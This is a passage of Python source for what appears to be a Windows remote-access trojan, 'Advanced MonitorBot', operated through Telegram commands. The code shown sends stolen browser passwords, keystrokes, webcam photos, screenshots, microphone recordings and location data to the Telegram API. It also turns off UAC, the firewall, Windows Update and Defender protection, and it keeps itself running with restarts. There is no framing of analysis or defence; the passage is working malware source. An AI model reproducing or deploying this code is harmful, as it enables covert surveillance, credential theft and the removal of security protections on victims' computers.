                    passwords_data.append(f"🔒 Password: [Encrypted - Master Key Required]")
                    passwords_data.append("-" * 40)
                    count += 1
            
            connection.close()
            os.remove(temp_db)
            
            passwords_data.append(f"\n✅ Edge: Found {count} passwords")
            return count
            
        except Exception as e:
            passwords_data.append(f"\n❌ Edge Error: {str(e)}")
            return 0

# ==================== LIVE AUDIO STREAMING ====================
class LiveAudioStream:
    """Live audio streaming system"""
    
    def __init__(self, bot, duration=60):
        self.bot = bot
        self.duration = duration
        self.is_streaming = False
        self.audio_data = []
        self.stream = None
    
    def audio_callback(self, indata, frames, time_info, status):
        """Audio stream callback"""
        if status:
            logger.log_error(f"Audio stream status: {status}")
        if self.is_streaming:
            self.audio_data.append(indata.copy())
    
    def start_stream(self):
        """Start audio streaming"""
        if self.is_streaming:
            return None
        
        try:
            self.is_streaming = True
            self.audio_data = []
            
            # Start audio stream
            self.stream = sd.InputStream(
                samplerate=config.AUDIO_FS,
                channels=1,
                callback=self.audio_callback,
                dtype='float32'
            )
            self.stream.start()
            
            # Record for specified duration
            start_time = time.time()
            while (time.time() - start_time) < self.duration and self.is_streaming:
                time.sleep(0.1)
            
            self.stream.stop()
            self.stream.close()
            self.stream = None
            
            # Save audio file
            if self.audio_data:
                audio_array = np.concatenate(self.audio_data, axis=0)
                output_path = os.path.join(config.QUEUE_DIR, f"live_audio_{int(time.time())}.wav")
                
                # Normalize audio
                if np.max(np.abs(audio_array)) > 0:
                    audio_array = audio_array / np.max(np.abs(audio_array))
                
                write(output_path, config.AUDIO_FS, np.int16(audio_array * 32767))
                
                self.is_streaming = False
                logger.log_info(f"Live audio stream saved: {output_path}")
                return output_path
            
            self.is_streaming = False
            return None
            
        except Exception as e:
            logger.log_error(f"Live audio streaming failed: {e}")
            self.is_streaming = False
            if self.stream:
                try:
                    self.stream.close()
                except:
                    pass
            return None
    
    def stop_stream(self):
        """Stop audio streaming"""
        self.is_streaming = False

# ==================== MAIN LOOP SYSTEM ====================
class MainLoop:
    """Main monitoring loop system"""
    
    def __init__(self, bot, capture_manager):
        self.bot = bot
        self.capture_manager = capture_manager
    
    def worker(self):
        """Main loop worker"""
        global loop_running
        
        while loop_running:
            try:
                start_time = time.time()
                
                if monitor_active:
                    # Capture all data types
                    files_to_send = []
                    
                    # Audio recording
                    audio_file = self.capture_manager.record_audio()
                    if audio_file:
                        files_to_send.append((audio_file, "audio"))
                    
                    # Desktop screenshot
                    desktop_file = self.capture_manager.capture_desktop()
                    if desktop_file:
                        files_to_send.append((desktop_file, "photo"))
                    
                    # Webcam capture
                    webcam_file = self.capture_manager.capture_webcam()
                    if webcam_file:
                        files_to_send.append((webcam_file, "photo"))
                    
                    # Send files if network available
                    if SystemUtils.network_available():
                        for file_path, file_type in files_to_send:
                            if os.path.exists(file_path):
                                self.bot.send_file(file_path, file_type)
                                try:
                                    os.remove(file_path)
                                except Exception as e:
                                    logger.log_error(f"File cleanup failed: {e}")
                
                # Calculate sleep time
                elapsed = time.time() - start_time
                sleep_time = max(1, config.LOOP_DELAY - elapsed)
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.log_error(f"Loop worker error: {e}")
                time.sleep(5)  # Wait before retry

def start_loop(bot, capture_manager):
    """Start main monitoring loop"""
    global loop_running, loop_thread
    
    if loop_running:
        return
    
    with loop_lock:
        loop_running = True
        main_loop = MainLoop(bot, capture_manager)
        loop_thread = Thread(target=main_loop.worker, daemon=True)
        loop_thread.start()
        logger.log_info("Main monitoring loop started")

def stop_loop(bot=None):
    """Stop main monitoring loop"""
    global loop_running
    with loop_lock:
        loop_running = False
    if bot:
        bot.send_message("🛑 Monitoring loop stopped")
    logger.log_info("Main monitoring loop stopped")

# ==================== STARTUP SYSTEM ====================
class StartupManager:
    """Startup and initialization system"""
    
    @staticmethod
    def startup_capture(bot, capture_manager):
        """Perform startup captures"""
        try:
            bot.send_message("🚀 *System Startup Detected*")
            
            # Send system information
            location_msg, geo_info = LocationService.build_location_message()
            bot.send_message(location_msg)
            
            # Send location if available
            if geo_info.get('latitude') and geo_info.get('longitude'):
                bot.send_location(geo_info['latitude'], geo_info['longitude'])
            
            # Send desktop screenshot
            desktop = capture_manager.capture_desktop()
            if desktop:
                bot.send_file(desktop, "photo", "🖥️ Desktop Screenshot")
                os.remove(desktop)
            
            # Send webcam photo
            webcam = capture_manager.capture_webcam()
            if webcam:
                bot.send_file(webcam, "photo", "📷 Webcam Photo")
                os.remove(webcam)
                
        except Exception as e:
            logger.log_error(f"Startup capture error: {e}")
    
    @staticmethod
    def clear_local_storage():
        """Clear local storage"""
        try:
            for filename in os.listdir(config.QUEUE_DIR):
                file_path = os.path.join(config.QUEUE_DIR, filename)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                except Exception as e:
                    logger.log_error(f"File deletion failed: {file_path} - {e}")
            
            logger.log_info("Local storage cleared")
            return True
        except Exception as e:
            logger.log_error(f"Storage clearance failed: {e}")
            return False

# ==================== COMMAND HANDLER ====================
class CommandHandler:
    """Telegram command handler"""
    
    def __init__(self, bot, capture_manager):
        self.bot = bot
        self.capture_manager = capture_manager
        self.audio_streamer = None
    
    def handle_commands(self):
        """Main command handling loop"""
        global offset, monitor_active, config, keylogger
        
        # Initialize keylogger
        if keylogger is None:
            keylogger = KeyLogger(self.bot)
        
        error_count = 0
        max_errors = 5
        
        while True:
            try:
                params = {"timeout": 30, "allowed_updates": ["message"]}
                if offset is not None:
                    params["offset"] = offset + 1
                else:
                    params["offset"] = None
                
                response = requests.get(
                    f"https://api.telegram.org/bot{config.TOKEN}/getUpdates",
                    params=params, 
                    timeout=35
                )
                
                if response.status_code != 200:
                    logger.log_error(f"Telegram API error: {response.status_code}")
                    error_count += 1
                    if error_count >= max_errors:
                        logger.log_error("Too many API errors, restarting...")
                        break
                    time.sleep(10)
                    continue
                
                # Reset error count on success
                error_count = 0
                
                updates = response.json().get("result", [])
                
                for update in updates:
                    offset = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "").strip()
                    chat_id = str(message.get("chat", {}).get("id"))
                    
                    if chat_id != config.CHAT_ID:
                        continue
                    
                    logger.log_info(f"Command received: {text}")
                    
                    # ✅ FIXED: Handle command in separate thread to avoid blocking
                    Thread(target=self.process_command, args=(text,), daemon=True).start()
                
                time.sleep(1)
                
            except requests.exceptions.Timeout:
                logger.log_error("Telegram API timeout")
                time.sleep(5)
            except requests.exceptions.ConnectionError:
                logger.log_error("Telegram API connection error")
                time.sleep(10)
            except Exception as e:
                logger.log_error(f"Command handler error: {e}")
                error_count += 1
                if error_count >= max_errors:
                    logger.log_error("Too many errors in command handler, restarting...")
                    break
                time.sleep(5)
    
    def process_command(self, text):
        """Process individual commands"""
        global monitor_active, config
        
        # 🛡️ UAC Control Commands
        if text == "/uacon":
            success, details = SecurityController.uac_control(enable=True)
            if success:
                self.bot.send_message(f"🛡️ UAC Enabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ UAC Enable Failed\n\n{details}")
        
        elif text == "/uacoff":
            success, details = SecurityController.uac_control(enable=False)
            if success:
                self.bot.send_message(f"🛡️ UAC Disabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ UAC Disable Failed\n\n{details}")
        
        # 🛡️ Security Control Commands
        elif text == "/winupdateon":
            success, details = SecurityController.windows_update_control(enable=True)
            if success:
                self.bot.send_message(f"✅ Windows Update Enabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Windows Update Enable Failed\n\n{details}")
        
        elif text == "/winupdateoff":
            success, details = SecurityController.windows_update_control(enable=False)
            if success:
                self.bot.send_message(f"✅ Windows Update Disabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Windows Update Disable Failed\n\n{details}")
        
        elif text == "/firewallon":
            success, details = SecurityController.windows_firewall_control(enable=True)
            if success:
                self.bot.send_message(f"✅ Firewall Enabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Firewall Enable Failed\n\n{details}")
        
        elif text == "/firewalloff":
            success, details = SecurityController.windows_firewall_control(enable=False)
            if success:
                self.bot.send_message(f"✅ Firewall Disabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Firewall Disable Failed\n\n{details}")
        
        elif text == "/realtimeon":
            success, details = SecurityController.defender_realtime_control(enable=True)
            if success:
                self.bot.send_message(f"✅ Defender Realtime Enabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Defender Enable Failed\n\n{details}")
        
        elif text == "/realtimeoff":
            success, details = SecurityController.defender_realtime_control(enable=False)
            if success:
                self.bot.send_message(f"✅ Defender Realtime Disabled\n\n{details}")
            else:
                self.bot.send_message(f"❌ Defender Disable Failed\n\n{details}")
        
        elif text == "/securitystatus":
            status = SecurityController.get_security_status()
            self.bot.send_message(status)
        
        # 🔍 Monitoring Commands
        elif text == "/monitoron":
            with monitor_lock:
                monitor_active = True
            self.bot.send_message("🟢 Monitoring Enabled")
        
        elif text == "/monitoroff":
            with monitor_lock:
                monitor_active = False
            self.bot.send_message("🟡 Monitoring Disabled")
        
        elif text == "/screenshot":
            desktop = self.capture_manager.capture_desktop()
            if desktop:
                self.bot.send_file(desktop, "photo", "🖥️ Desktop Screenshot")
                os.remove(desktop)
            else:
                self.bot.send_message("❌ Screenshot failed")
        
        elif text == "/photo":
            webcam = self.capture_manager.capture_webcam()
            if webcam:
                self.bot.send_file(webcam, "photo", "📷 Webcam Photo")
                os.remove(webcam)
            else:
                self.bot.send_message("❌ Webcam capture failed")
        
        elif text == "/status":
            system_info = LocationService.get_system_info()
            status_msg = f"💻 CPU: {system_info.get('cpu_usage', 'N/A')}% | RAM: {system_info.get('ram_usage', 'N/A')}%"
            self.bot.send_message(status_msg)
        
        elif text == "/location":
            location_msg, geo_info = LocationService.build_location_message()
            self.bot.send_message(location_msg)
            if geo_info.get('latitude') and geo_info.get('longitude'):
                self.bot.send_location(geo_info['latitude'], geo_info['longitude'])
        
        # ⌨️ Advanced Features
        elif text == "/keylogstart":
            if keylogger.start():
                self.bot.send_message("⌨️ Keylogger Started")
            else:
                self.bot.send_message("❌ Keylogger Start Failed")
        
        elif text == "/keylogstop":
            keylogger.stop()
            self.bot.send_message("⏹️ Keylogger Stopped")
        
        elif text == "/keylogsend":
            keylogger.send_log()
            self.bot.send_message("📤 Keylogs Sent")
        
        elif text == "/passwords":
            passwords = PasswordRecovery.get_browser_passwords()
            if passwords and len(passwords) > 2:
                pass_file = os.path.join(config.QUEUE_DIR, "passwords.txt")
                with open(pass_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(passwords))
                self.bot.send_file(pass_file, "document", "🔑 Browser Passwords")
                os.remove(pass_file)
            else:
                self.bot.send_message("❌ No passwords found")
        
        elif text.startswith("/recordvideo"):
            try:
                duration = 30
                parts = text.split()
                if len(parts) > 1:
                    duration = min(int(parts[1]), 120)  # Max 2 minutes
                
                self.bot.send_message(f"🎥 Recording {duration}s video...")
                video_file = self.capture_manager.record_video(duration)
                if video_file:
                    self.bot.send_file(video_file, "document", f"📹 {duration}s Video Recording")
                    os.remove(video_file)
                else:
                    self.bot.send_message("❌ Video recording failed")
            except Exception as e:
                self.bot.send_message(f"❌ Video error: {e}")
        
        elif text.startswith("/livestream"):
            try:
                duration = 60
                parts = text.split()
                if len(parts) > 1:
                    duration = min(int(parts[1]), 300)  # Max 5 minutes
                
                if self.audio_streamer is None:
                    self.audio_streamer = LiveAudioStream(self.bot)
                
                self.bot.send_message(f"🎤 Streaming {duration}s audio...")
                audio_file = self.audio_streamer.start_stream()
                if audio_file:
                    self.bot.send_file(audio_file, "audio", f"🎤 {duration}s Audio Stream")
                    os.remove(audio_file)
                else:
                    self.bot.send_message("❌ Audio streaming failed")
            except Exception as e:
                self.bot.send_message(f"❌ Audio error: {e}")
        
        # ⚡ System Commands
        elif text == "/startloop":
            start_loop(self.bot, self.capture_manager)
            self.bot.send_message("🔄 Auto-capture Started")
        
        elif text == "/stoploop":
            stop_loop(self.bot)
            self.bot.send_message("⏹️ Auto-capture Stopped")
        
        elif text.startswith("/setdelay"):
            try:
                new_delay = int(text.split()[1])
                if new_delay >= 5:
                    config.LOOP_DELAY = new_delay
                    self.bot.send_message(f"⏱️ Loop delay set to {config.LOOP_DELAY}s")
                else:
                    self.bot.send_message("❌ Delay must be ≥5 seconds")
            except:
                self.bot.send_message("❌ Usage: /setdelay <seconds>")
        
        elif text == "/shutdown":
            os.system("shutdown /s /t 5")
            self.bot.send_message("🔌 Shutting down in 5 seconds...")
        
        elif text == "/reboot":
            os.system("shutdown /r /t 5")
            self.bot.send_message("🔄 Rebooting in 5 seconds...")
        
        elif text == "/lock":
            ctypes.windll.user32.LockWorkStation()
            self.bot.send_message("🔒 Workstation Locked")
        
        # 🎭 Special Effects
        elif text.startswith("/fakelow"):
            try:
                percent = 10
                parts = text.split()
                if len(parts) > 1:
                    percent = max(1, min(100, int(parts[1])))
                SpecialEffects.fake_battery_overlay(percent)
                self.bot.send_message(f"🔋 Fake battery {percent}% shown")
            except:
                self.bot.send_message("❌ Usage: /fakelow [percent]")
        
        elif text == "/fakelowshutdown":
            SpecialEffects.fake_battery_shutdown()
            self.bot.send_message("🔋 Fake battery shutdown started")
        
        elif text.startswith("/note"):
            message = text[5:].strip()
            if message:
                SpecialEffects.show_note_popup(message)
                self.bot.send_message(f"📝 Note shown: {message}")
            else:
                self.bot.send_message("❌ Usage: /note <message>")
        
        # 🗑️ Cleanup
        elif text == "/historyclear":
            if StartupManager.clear_local_storage():
                self.bot.send_message("🗑️ History Cleared")
            else:
                self.bot.send_message("❌ Clear failed")
        
        elif text == "/help":
            self.bot.send_message(self.get_help_text())
        
        else:
            self.bot.send_message("❓ Unknown command. Use /help for list.")
    
    @staticmethod
    def get_help_text():
        """Get help text"""
        return """
🎯 *Advanced MonitorBot - Command List*

🛡️ *UAC Control*
• `/uacon` - UAC Enable
• `/uacoff` - UAC Disable

🛡️ *Security Control*  
• `/winupdateon` - Windows Update Enable
• `/winupdateoff` - Windows Update Disable
• `/firewallon` - Firewall Enable
• `/firewalloff` - Firewall Disable
• `/realtimeon` - Defender Enable
• `/realtimeoff` - Defender Disable
• `/securitystatus` - Security Status

🔍 *Monitoring*
• `/monitoron` - Start Monitoring
• `/monitoroff` - Stop Monitoring  
• `/screenshot` - Desktop Screenshot
• `/photo` - Webcam Photo
• `/status` - System Status
• `/location` - Location Info

⌨️ *Advanced Features*
• `/keylogstart` - Start Keylogger
• `/keylogstop` - Stop Keylogger
• `/keylogsend` - Send Keylogs
• `/passwords` - Browser Passwords
• `/recordvideo [sec]` - Record Video
• `/livestream [sec]` - Live Audio

⚡ *System Control*
• `/startloop` - Start Auto-capture
• `/stoploop` - Stop Auto-capture
• `/setdelay N` - Set Loop Delay
• `/shutdown` - Shutdown PC
• `/reboot` - Reboot PC
• `/lock` - Lock Workstation

🎭 *Special Effects*
• `/fakelow [%]` - Fake Battery
• `/fakelowshutdown` - Fake Shutdown
• `/note <msg>` - Popup Note

🗑️ *Cleanup*
• `/historyclear` - Clear History

🆘 *Help*
• `/help` - This Message

🔧 *Version 3.1* - All Bugs Fixed | Stable Release
"""

# ==================== MAIN APPLICATION ====================
def main():
    """Main application entry point"""
    global keylogger
    
    try:
        # Set working directory
        os.chdir(config.CURRENT_DIR)
        logger.log_info("🚀 Advanced MonitorBot Starting...")
        
        # Initialize components
        bot = TelegramBot()
        capture_manager = CaptureManager()
        keylogger = KeyLogger(bot)
        
        # Send startup message
        if SystemUtils.network_available():
            bot.send_message(f"🚀 *Advanced MonitorBot v3.1 Started*\n\n🕒 {SystemUtils.timestamp_now()}")
            
            # Perform startup captures in background
            Thread(
                target=StartupManager.startup_capture,
                args=(bot, capture_manager),
                daemon=True
            ).start()
        
        # Start command handler
        command_handler = CommandHandler(bot, capture_manager)
        command_thread = Thread(target=command_handler.handle_commands, daemon=True)
        command_thread.start()
        
        # Start main monitoring loop
        start_loop(bot, capture_manager)
        
        logger.log_info("🎯 MonitorBot fully operational")
        
        # Keep-alive loop
        while True:
            time.sleep(10)
            
            # Health checks
            if not loop_running:
                logger.log_info("Main loop stopped, restarting...")
                start_loop(bot, capture_manager)
            
            # Periodic status updates (every 5 minutes)
            if int(time.time()) % 300 == 0:
                if SystemUtils.network_available():
                    system_info = LocationService.get_system_info()
                    status_msg = f"💚 System OK | CPU: {system_info.get('cpu_usage', 'N/A')}% | RAM: {system_info.get('ram_usage', 'N/A')}%"
                    bot.send_message(status_msg)
                
    except Exception as e:
        logger.log_error(f"🚨 Critical error in main: {e}")
        
        # Try to send error notification
        try:
            bot = TelegramBot()
            bot.send_message(f"🚨 MonitorBot Crashed: {str(e)[:100]}...")
        except:
            pass
        
        # Wait and restart
        time.sleep(30)
        logger.log_info("🔄 Attempting restart...")
        # Don't call main() recursively - will be handled by wrapper

# ==================== APPLICATION WRAPPER ====================
def run_with_restart():
    """Wrapper to handle application restarts"""
    restart_count = 0
    max_restarts = 10
    
    while restart_count < max_restarts:
        try:
            SystemUtils.run_as_admin()
            main()
        except Exception as e:
            restart_count += 1
            logger.log_error(f"Application crash #{restart_count}: {e}")
            
            if restart_count >= max_restarts:
                logger.log_error("🚨 Maximum restart attempts reached. Exiting.")
                break
                
            time.sleep(30)
            logger.log_info(f"🔄 Restarting application... ({restart_count}/{max_restarts})")

if __name__ == "__main__":
    # ✅ FIXED: Use wrapper instead of recursive call
    run_with_restart()